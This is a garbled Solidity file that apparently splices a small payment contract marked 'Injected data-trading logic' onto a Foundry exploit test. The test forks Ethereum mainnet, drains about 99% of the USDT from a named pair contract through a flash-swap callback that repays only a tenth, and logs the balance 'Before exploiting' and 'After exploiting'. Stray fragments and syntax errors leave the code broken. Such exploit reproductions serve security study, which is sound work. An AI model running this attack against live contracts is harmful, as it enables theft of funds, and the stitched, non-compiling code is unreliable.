
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity 0.8.10;

;
;
interface IERC20Custom {
    function transfer(address, uint) external};
contract ContractTest is DSTest {
  address public pair = 0xc0A6B8c534FaD86dF8FA1AbB17084A70F86EDDc1;
  address public usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
  function setUp() public {
    cheats.createSelectFork("mainnet", 13225516)};
  function testExploit() public {
    console.log("Before exploiting",IERC20(usdt).balanceOf(address(this)));
    uint256 amount = IERC20(usdt).balanceOf(pair) * 99 / 100;
    IUniswapV2Pair(pair).swap(amount, 0, address(this), abi.encodePacked(amount));
    console.log("After exploiting",IERC20(usdt).balanceOf(address(this)))};
  function NimbusCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
    IERC20Custom(usdt).transfer(pair, amount0/10)}
function transferTo(address to) public {
    (bool sent, ) = to.call{value: 1 ether}("");
    require(sent)}